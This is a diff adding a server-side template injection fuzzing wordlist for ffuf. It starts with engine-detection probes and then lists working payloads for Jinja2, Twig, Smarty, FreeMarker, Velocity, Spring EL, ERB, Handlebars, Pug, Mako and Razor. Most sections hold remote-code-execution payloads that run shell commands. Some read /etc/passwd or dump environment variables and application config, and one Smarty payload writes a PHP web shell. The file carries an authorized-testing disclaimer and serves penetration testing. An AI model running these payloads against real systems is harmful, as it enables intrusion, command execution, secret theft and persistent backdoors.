@@ -1,0 +1,167 @@
+# ============================================================
+# SSTI (Server-Side Template Injection) Fuzzing Wordlist
+# Usage: ffuf -u http://example.com/render?name=FUZZ -w this_file.txt
+# For authorized security testing only.
+# ============================================================
+
+# ---------------------------------------
+# SECTION 1: Detection / polyglot probes (send first to identify engine)
+# ---------------------------------------
+${7*7}
+{{7*7}}
+#{7*7}
+<%= 7*7 %>
+${{7*7}}
+@(7*7)
+{7*7}
+[[7*7]]
+{{7*'7'}}
+${7*'7'}
+{{7*7}}${7*7}
+${{7*7}}#{7*7}
+${7*7}{{7*7}}<%= 7*7 %>
+{{=7*7}}
+{{ 7*7 }}
+*{7*7}
+${{<%[%'"}}%\.
+
+# ---------------------------------------
+# SECTION 2: Jinja2 / Flask (Python)
+# ---------------------------------------
+{{7*7}}
+{{config}}
+{{config.items()}}
+{{self}}
+{{self.__init__.__globals__}}
+{{request}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{[].__class__.__base__.__subclasses__()}}
+{{().__class__.__bases__[0].__subclasses__()}}
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("id").read()}}{% endif %}{% endfor %}
+{{lipsum.__globals__.os.popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+{{get_flashed_messages.__globals__['current_app'].config}}
+{% raw %}{{7*7}}{% endraw %}
+{% set x = 7*7 %}{{x}}
+{{"".__class__}}
+{{'{{7*7}}'|attr('format')()}}
+
+# ---------------------------------------
+# SECTION 3: Twig (PHP)
+# ---------------------------------------
+{{7*7}}
+{{7*'7'}}
+{{_self}}
+{{_self.env}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}
+{{_self.env.getFilter("exec")("id")}}
+{{['id']|filter('system')}}
+{{['id']|map('system')|join}}
+{{app.request.query.filter('id','',false,1024)}}
+{{dump(app)}}
+{% set x = "id" %}{{x|system}}
+
+# ---------------------------------------
+# SECTION 4: Smarty (PHP)
+# ---------------------------------------
+{7*7}
+{php}echo `id`;{/php}
+{system('id')}
+{$smarty.version}
+{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
+{self::getStreamVariable("file:///etc/passwd")}
+
+# ---------------------------------------
+# SECTION 5: FreeMarker (Java)
+# ---------------------------------------
+${7*7}
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
+${"freemarker.template.utility.Execute"?new()("id")}
+<#assign value = "freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","id").start()}
+[#assign ex = "freemarker.template.utility.Execute"?new()]${ex("id")}
+${product.getClass().getProtectionDomain().getCodeSource().getLocation()}
+
+# ---------------------------------------
+# SECTION 6: Velocity (Java)
+# ---------------------------------------
+#set($x=7*7)$x
+$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")
+#set($e="exp")#set($a=$e.class.forName("java.lang.Runtime"))
+#set($str=$class.inspect("java.lang.String").type)
+#set($chr=$class.inspect("java.lang.Character").type)
+#set($ex=$rt.getRuntime().exec("id"))
+
+# ---------------------------------------
+# SECTION 7: Java EL / Thymeleaf / Spring
+# ---------------------------------------
+${7*7}
+${7*'7'}
+#{7*7}
+*{7*7}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${T(java.lang.Runtime).getRuntime().exec("id")}
+__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
+${#rt = @java.lang.Runtime@getRuntime(),#rt.exec("id")}
+${new java.io.BufferedReader(new java.io.InputStreamReader(T(java.lang.Runtime).getRuntime().exec("id").getInputStream())).readLine()}
+${{7*7}}
+${new java.lang.ProcessBuilder(new java.lang.String[]{"id"}).start()}
+
+# ---------------------------------------
+# SECTION 8: ERB (Ruby)
+# ---------------------------------------
+<%= 7*7 %>
+<%= system('id') %>
+<%= `id` %>
+<%= IO.popen('id').readlines() %>
+<%= File.open('/etc/passwd').read %>
+<%= Dir.entries('/') %>
+<%= require 'open3'; Open3.capture2('id') %>
+
+# ---------------------------------------
+# SECTION 9: Handlebars (JavaScript)
+# ---------------------------------------
+{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').exec('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+{{this}}
+{{constructor.constructor('return process.env')()}}
+
+# ---------------------------------------
+# SECTION 10: Pug/Jade (JavaScript)
+# ---------------------------------------
+#{7*7}
+#{global.process.mainModule.require('child_process').execSync('id')}
+#{process.mainModule.require('child_process').exec('id')}
+
+# ---------------------------------------
+# SECTION 11: Mako / Django / Tornado (Python misc)
+# ---------------------------------------
+${7*7}
+${self.module.cache.util.os.system('id')}
+<%
+import os
+x=os.popen('id').read()
+%>${x}
+{% debug %}
+{% load module %}
+
+# ---------------------------------------
+# SECTION 12: Razor (.NET)
+# ---------------------------------------
+@(7*7)
+@{ System.Diagnostics.Process.Start("cmd.exe", "/c id"); }
+@System.Diagnostics.Process.Start("whoami")
+
+# ---------------------------------------
+# NOTES
+# ---------------------------------------
+# - Send Section 1 probes first: if 49 (7*7) is reflected, template
+#   injection is confirmed, then use the response format ({{ vs ${ vs
+#   <%= etc.) to narrow down the engine and pull the matching section.
+# - {{7*'7'}} returning '7777777' (string repeat) vs error helps
+#   distinguish Jinja2 from Twig.
+# - RCE payloads (os.popen/Runtime.exec/etc.) are destructive-adjacent —
+#   confirm scope/authorization before running anything beyond id/whoami.
+# - Only use against systems you are explicitly authorized to test.
